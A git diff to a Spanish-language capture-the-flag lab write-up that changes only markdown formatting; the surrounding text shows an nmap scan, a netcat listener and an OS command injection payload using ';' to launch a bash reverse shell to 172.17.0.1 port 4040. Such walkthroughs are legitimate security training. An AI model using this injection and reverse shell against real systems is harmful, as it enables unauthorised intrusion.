@@ -14,7 +14,7 @@ nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000
 Esta abierto unicamente el puerto 80, por lo que habra que investigar la pagina para buscar una vulnerabilidad.
 
 ## Paso N2: Visualizacion web e inyeccion 
-Al entrar, podemos ver que la web se compone unicamente de un buscador, por lo que intentamos una inyeccion a nivel de sistema operativo (OS Command Injection) anteponiendo ";" del comando (usamos el ; porque actúa como un separador de comandos en sistemas operativos tipo Unix/Linux). Utilizaremos el siguiente comando mientras escuchamos en el puerto 4040 con nc para poder lograr una reverse shell ```nc -lvnp 4040```.
+Al entrar, podemos ver que la web se compone unicamente de un buscador, por lo que intentamos una inyeccion a nivel de sistema operativo (OS Command Injection) anteponiendo "```;```" del comando (usamos el ```;``` porque actúa como un separador de comandos en sistemas operativos tipo Unix/Linux). Utilizaremos el siguiente comando mientras escuchamos en el puerto 4040 con nc para poder lograr una reverse shell ```nc -lvnp 4040```.
 ```
 ;bash -c 'bash -i >& /dev/tcp/172.17.0.1/4040 0>&1'
 ```
